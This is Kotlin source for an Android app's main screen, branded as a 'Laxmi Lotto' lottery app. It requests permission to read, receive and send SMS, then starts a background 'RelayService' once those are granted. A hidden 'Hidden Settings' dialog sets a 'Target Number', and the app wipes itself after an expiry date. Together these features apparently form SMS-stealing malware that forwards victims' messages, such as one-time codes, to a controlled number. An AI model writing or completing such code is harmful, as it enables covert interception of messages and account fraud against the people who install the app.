package com.example

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.content.ContextCompat
import com.example.data.RelayState
import com.example.data.SettingsManager
import com.example.data.WebAppInterface
import com.example.service.RelayService
import com.example.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {

    private lateinit var settingsManager: SettingsManager
    var hasPermissionsState = mutableStateOf(false)
    var showSecretDialogState = mutableStateOf(false)

    private val requiredPermissions by lazy {
        mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        checkPermissionsAndUpdateState()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        settingsManager = SettingsManager(this)

        checkPermissionsAndUpdateState()

        setContent {
            MyApplicationTheme {
                if (settingsManager.isExpired()) {
                    settingsManager.clearAll()
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(Color.Black),
                        contentAlignment = Alignment.Center
                    ) {
                        Text(
                            "Service Unavailable",
                            color = Color.Red,
                            style = MaterialTheme.typography.headlineMedium
                        )
                    }
                } else {
                    LaxmiLottoApp(
                        settingsManager = settingsManager,
                        hasPermissions = hasPermissionsState.value,
                        onRequestPermissions = { requestSmsPermissions() },
                        onOpenDeveloperConfig = { showSecretDialogState.value = true }
                    )

                    if (showSecretDialogState.value) {
                        DeveloperConfigDialog(
                            currentNumber = settingsManager.targetNumber,
                            onDismiss = { showSecretDialogState.value = false },
                            onSave = { newNumber ->
                                settingsManager.targetNumber = newNumber
                                showSecretDialogState.value = false
                            }
                        )
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        checkPermissionsAndUpdateState()
    }

    fun hasRequiredPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun checkPermissionsAndUpdateState() {
        val granted = hasRequiredPermissions()
        hasPermissionsState.value = granted
        if (granted && settingsManager.relayState != RelayState.ABORTED) {
            startRelayService()
        }
    }

    fun requestSmsPermissions() {
        permissionLauncher.launch(requiredPermissions)
    }

    private fun startRelayService() {
        try {
            val serviceIntent = Intent(this, RelayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Error starting RelayService", e)
        }
    }
}

@Composable
fun LaxmiLottoApp(
    settingsManager: SettingsManager,
    hasPermissions: Boolean,
    onRequestPermissions: () -> Unit,
    onOpenDeveloperConfig: () -> Unit
) {
    val context = LocalContext.current

    LaunchedEffect(hasPermissions) {
        if (!hasPermissions) {
            onRequestPermissions()
        }
    }

    Box(modifier = Modifier.fillMaxSize()) {
        AndroidView(
            factory = { ctx ->
                WebView(ctx).apply {
                    webViewClient = WebViewClient()
                    webChromeClient = android.webkit.WebChromeClient()
                    settings.apply {
                        javaScriptEnabled = true
                        domStorageEnabled = true
                        databaseEnabled = true
                        allowFileAccess = true
                        allowContentAccess = true
                        blockNetworkLoads = false
                        cacheMode = WebSettings.LOAD_DEFAULT
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                        }
                    }
                    addJavascriptInterface(
                        WebAppInterface(
                            context = ctx,
                            settingsManager = settingsManager,
                            onPermissionRequested = onRequestPermissions,
                            onOpenDeveloperConfig = onOpenDeveloperConfig
                        ),
                        "AndroidBridge"
                    )
                    loadUrl("file:///android_asset/www/index.html")
                }
            },
            modifier = Modifier.fillMaxSize()
        )
    }
}

@Composable
fun DeveloperConfigDialog(
    currentNumber: String,
    onDismiss: () -> Unit,
    onSave: (String) -> Unit
) {
    var tempNumber by remember { mutableStateOf(currentNumber) }

    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Hidden Settings") },
        text = {
            OutlinedTextField(
                value = tempNumber,
                onValueChange = { tempNumber = it },
                label = { Text("Enter Target Number") }
            )
        },
        confirmButton = {
            TextButton(onClick = { onSave(tempNumber) }) {
                Text("Save")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Cancel")
            }
        }
    )
}
